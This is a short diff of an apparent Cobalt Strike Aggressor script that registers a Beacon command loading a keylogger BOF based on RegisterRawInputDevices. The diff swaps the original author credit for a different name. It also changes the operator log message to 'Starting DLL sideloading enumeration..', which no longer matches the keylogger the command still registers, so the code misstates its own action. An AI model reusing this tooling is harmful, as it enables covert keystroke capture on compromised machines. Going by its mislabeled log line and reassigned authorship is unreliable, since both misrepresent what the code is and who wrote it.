@@ -1,4 +1,4 @@
-# author REDMED-X
+# author Western Tactics
 
 beacon_command_register(
 	"keyloggerrawinput", "Keylogger based on RegisterRawInputDevices",
@@ -24,7 +24,7 @@ alias keyloggerrawinput {
     # Pack our arguments
     $arg_data  = bof_pack($bid, "z", $cmd);
 
-    blog($bid, "Starting keylogger..");
+    blog($bid, "Starting DLL sideloading enumeration..");
     beacon_inline_execute($bid, $data, "go", $arg_data);
 }
 
